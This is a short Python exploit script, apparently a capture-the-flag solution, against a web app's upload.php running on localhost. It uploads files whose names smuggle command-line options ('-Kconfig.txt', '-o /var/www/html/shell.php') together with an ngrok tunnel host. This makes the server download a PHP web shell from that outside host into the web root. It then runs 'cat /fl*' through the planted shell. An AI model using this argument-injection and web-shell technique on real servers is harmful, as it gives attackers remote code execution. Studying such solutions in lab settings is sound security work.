import requests

s = requests.Session()

url = "http://localhost:8000"

s.get(url)

files = [
    ("file", ("0.tcp.in.ngrok.io:19824", "")),
    ("file", ("-Kconfig.txt", "")),
    ("file", ("config.txt", "-o /var/www/html/shell.php")),
]

for file in files:
    s.post(f"{url}/upload.php", files=[file])

r = s.get(f"{url}/test.php")
r = s.get(f"{url}/shell.php?cmd=cat+/fl*")
print(r.text)
